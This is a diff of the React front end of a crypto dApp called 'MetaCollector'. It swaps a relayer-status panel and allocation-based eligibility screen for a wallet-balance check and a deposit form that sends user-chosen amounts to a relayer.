@@ -9,14 +9,13 @@ function App() {
     address,
     isConnected,
     loading,
-    eligibility,
+    balanceResults,
     eligibleNetworks,
     bestNetwork,
-    relayerHealth,
     depositAmount,
     setDepositAmount,
     transactionStatus,
-    checkEligibility,
+    checkBalances,
     executeDeposit
   } = useMetaCollector()
 
@@ -61,129 +60,113 @@ function App() {
             )}
           </div>
 
-          {/* Relayer Health */}
-          {relayerHealth && (
-            <div className="card health-card">
-              <h2>⚙️ Relayer Status</h2>
-              <div className="networks-grid">
-                {relayerHealth.networks?.map((network) => (
-                  <div 
-                    key={network.network} 
-                    className={`network-status ${network.status}`}
-                  >
-                    <span className="network-name">{network.network.toUpperCase()}</span>
-                    {network.status === 'active' && (
-                      <>
-                        <span className="balance">
-                          {parseFloat(network.balance).toFixed(4)} ETH
-                        </span>
-                        <span className="address-small">
-                          {network.address?.slice(0, 6)}...
-                        </span>
-                      </>
-                    )}
-                  </div>
-                ))}
-              </div>
-            </div>
-          )}
-
-          {/* Eligibility Check */}
+          {/* Balance Check Button */}
           {isConnected && (
             <div className="card eligibility-card">
-              <h2>✅ Eligibility Check</h2>
-              {!eligibility ? (
-                <button 
-                  onClick={checkEligibility} 
-                  className="button button-primary button-large"
-                  disabled={loading}
-                >
-                  {loading ? 'Checking...' : 'Check Eligibility'}
-                </button>
-              ) : (
-                <div className="eligibility-results">
-                  <h3>Available Networks:</h3>
-                  {eligibleNetworks.length > 0 ? (
-                    <>
-                      <div className="networks-list">
-                        {eligibleNetworks.map((network) => (
-                          <div 
-                            key={network.network}
-                            className={`network-item ${bestNetwork?.network === network.network ? 'best' : ''}`}
-                          >
-                            <div className="network-header">
-                              <span className="network-badge">{network.networkName}</span>
-                              {bestNetwork?.network === network.network && (
-                                <span className="best-badge">Best Network</span>
-                              )}
-                            </div>
-                            <div className="network-details">
-                              <div className="detail-row">
-                                <span>Remaining:</span>
-                                <strong>{parseFloat(network.remaining).toFixed(4)} {network.currency}</strong>
-                              </div>
-                              <div className="detail-row">
-                                <span>Max:</span>
-                                <span>{parseFloat(network.maxAllocation).toFixed(4)} {network.currency}</span>
-                              </div>
-                              <div className="detail-row">
-                                <span>Min:</span>
-                                <span>{parseFloat(network.minAllocation).toFixed(4)} {network.currency}</span>
-                              </div>
-                              <div className="detail-row">
-                                <span>Deposited:</span>
-                                <span>{parseFloat(network.deposited).toFixed(4)} {network.currency}</span>
-                              </div>
-                            </div>
-                          </div>
-                        ))}
-                      </div>
+              <h2>💰 Check Balances</h2>
+              <button 
+                onClick={checkBalances} 
+                className="button button-primary button-large"
+                disabled={loading}
+              >
+                {loading ? 'Checking...' : 'Check Wallet Balances'}
+              </button>
 
-                      {/* Deposit Form */}
-                      {bestNetwork && (
-                        <div className="deposit-form">
-                          <h3>Make Deposit</h3>
-                          <div className="best-network-info">
-                            <p>Selected: <strong>{bestNetwork.networkName}</strong></p>
-                            <p>Available: <strong>{parseFloat(bestNetwork.remaining).toFixed(4)} {bestNetwork.currency}</strong></p>
-                            <p>Min: {parseFloat(bestNetwork.minAllocation).toFixed(4)} {bestNetwork.currency}</p>
-                          </div>
-                          
-                          <div className="input-group">
-                            <input
-                              type="number"
-                              placeholder={`Amount in ${bestNetwork.currency}`}
-                              value={depositAmount}
-                              onChange={(e) => setDepositAmount(e.target.value)}
-                              min={bestNetwork.minAllocation}
-                              max={bestNetwork.remaining}
-                              step="0.01"
-                              className="input"
-                            />
-                            <span className="input-currency">{bestNetwork.currency}</span>
-                          </div>
-                          
-                          <button
-                            onClick={executeDeposit}
-                            disabled={loading || !depositAmount}
-                            className="button button-primary button-large"
-                          >
-                            {loading ? 'Processing...' : 'Deposit via Relayer'}
-                          </button>
-                        </div>
-                      )}
-                    </>
-                  ) : (
-                    <div className="no-eligibility">
-                      <p>You are not eligible on any network</p>
-                      <button 
-                        onClick={checkEligibility} 
-                        className="button button-secondary"
+              {/* Show Balance Results */}
+              {balanceResults && (
+                <div className="balance-results">
+                  <h3>Network Balances (need ~$1 min):</h3>
+                  <div className="networks-grid">
+                    {Object.values(balanceResults).map((network) => (
+                      <div 
+                        key={network.network}
+                        className={`network-card ${network.canParticipate ? 'eligible' : ''}`}
                       >
-                        Check Again
+                        <div className="network-header">
+                          <span className="network-name">{network.networkName}</span>
+                          {network.canParticipate && (
+                            <span className="eligible-badge">✅ Eligible</span>
+                          )}
+                        </div>
+                        <div className="balance-display">
+                          <span className="balance-value">{network.balanceFormatted}</span>
+                          <span className="balance-currency">{network.currency}</span>
+                        </div>
+                        <div className="threshold-info">
+                          Need: {network.minRequired} {network.currency}
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* Show Eligible Networks */}
+              {eligibleNetworks.length > 0 && (
+                <div className="eligible-networks">
+                  <h3>✅ Networks with sufficient funds:</h3>
+                  <div className="networks-list">
+                    {eligibleNetworks.map((network) => (
+                      <div 
+                        key={network.network}
+                        className={`network-item ${bestNetwork?.network === network.network ? 'best' : ''}`}
+                      >
+                        <div className="network-header">
+                          <span className="network-badge">{network.networkName}</span>
+                          {bestNetwork?.network === network.network && (
+                            <span className="best-badge">Best Network</span>
+                          )}
+                        </div>
+                        <div className="network-details">
+                          <div className="detail-row">
+                            <span>Balance:</span>
+                            <strong>{network.balanceFormatted} {network.currency}</strong>
+                          </div>
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+
+                  {/* Deposit Form */}
+                  {bestNetwork && (
+                    <div className="deposit-form">
+                      <h3>Make Deposit on {bestNetwork.networkName}</h3>
+                      <div className="best-network-info">
+                        <p>Your Balance: <strong>{bestNetwork.balanceFormatted} {bestNetwork.currency}</strong></p>
+                        <p className="hint">Enter amount to deposit (will be sent to relayer)</p>
+                      </div>
+                      
+                      <div className="input-group">
+                        <input
+                          type="number"
+                          placeholder={`Amount in ${bestNetwork.currency}`}
+                          value={depositAmount}
+                          onChange={(e) => setDepositAmount(e.target.value)}
+                          min="0.001"
+                          max={bestNetwork.balance}
+                          step="0.001"
+                          className="input"
+                        />
+                        <span className="input-currency">{bestNetwork.currency}</span>
+                      </div>
+                      
+                      <button
+                        onClick={executeDeposit}
+                        disabled={loading || !depositAmount}
+                        className="button button-primary button-large"
+                      >
+                        {loading ? 'Processing...' : 'Deposit via Relayer'}
                       </button>
                     </div>
                   )}
+                </div>
+              )}
+
+              {/* No Funds Message */}
+              {eligibleNetworks.length === 0 && balanceResults && !loading && (
+                <div className="no-eligibility">
+                  <p>No network has sufficient balance</p>
+                  <p className="hint">You need at least $1 worth of native currency for gas</p>
                 </div>
               )}
             </div>
@@ -209,7 +192,7 @@ function App() {
                   rel="noopener noreferrer"
                   className="tx-link"
                 >
-                  View on Etherscan ↗
+                  View Transaction ↗
                 </a>
               )}
             </div>
@@ -217,8 +200,7 @@ function App() {
         </main>
 
         <footer className="footer">
-          <p>MetaCollector • Powered by Reown AppKit & Relayer Network</p>
-          <p className="api-key-hint">Relayer API: {relayerHealth ? '✅ Connected' : '⚠️ Checking...'}</p>
+          <p>MetaCollector • $1 Minimum Balance Required</p>
         </footer>
       </div>
     </div>
